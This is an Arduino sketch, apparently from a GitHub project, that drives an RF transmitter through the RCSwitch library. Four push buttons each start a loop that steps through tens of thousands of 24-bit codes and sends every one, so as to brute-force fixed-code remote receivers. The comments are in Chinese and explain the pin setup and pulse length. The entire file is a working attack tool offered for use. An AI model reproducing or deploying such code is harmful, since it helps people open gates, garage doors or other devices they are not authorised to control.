/*
  Brute Force Attack 4 ^ 8 Remote Control
  
  https://github.com/ZMOM1031/bruteforce3-8remote
  
*/

#include <stdio.h>
#include <RCSwitch.h>

RCSwitch mySwitch = RCSwitch();

// 定义 4 个按键针脚
const int button_a = 10;
const int button_b = 16;
const int button_c = 14;
const int button_d = 15;

int butStatA = 0;
int butStatB = 0;
int butStatC = 0;
int butStatD = 0;
int dfa = 256;

void setup() {

  Serial.begin(9600);
  
  mySwitch.enableTransmit(9);    // 定义发送模块的数据传输针脚
  mySwitch.setPulseLength(170);   // 定义脉冲长度，这个值具体看你使用的遥控器而定
  pinMode(button_a, INPUT);
  pinMode(button_b, INPUT);
  pinMode(button_c, INPUT);
  pinMode(button_d, INPUT);
  
}

void loop() {

  // read the state of the pushbutton value:
  butStatA = digitalRead(button_a);
  butStatB = digitalRead(button_b);
  butStatC = digitalRead(button_c);
  butStatD = digitalRead(button_d);

  // Button A
  if (butStatA == HIGH) {    // check if the pushbutton is pressed.
    for (long i = 4380; i < 4500; i++ ){
      long key = long(i * dfa) + int(192);
      mySwitch.send(key, 24);
    }
  }
  
  // Button B
  if (butStatB == HIGH) {
    for (long i = 0; i < 65535; i++ ){
      long key = long(i * dfa) + int(48);
      mySwitch.send(key, 24);
    }
  }
  
  // Button C
  if (butStatC == HIGH) {
    for (long i = 0; i < 65535; i++ ){
      long key = long(i * dfa) + int(12);
      mySwitch.send(key, 24);
    }
  }
  
  // Button D
  if (butStatD == HIGH) {
    for (long i = 0; i < 65535; i++ ){
      long key = long(i * dfa) + int(3);
      mySwitch.send(key, 24);
    }
  }

}
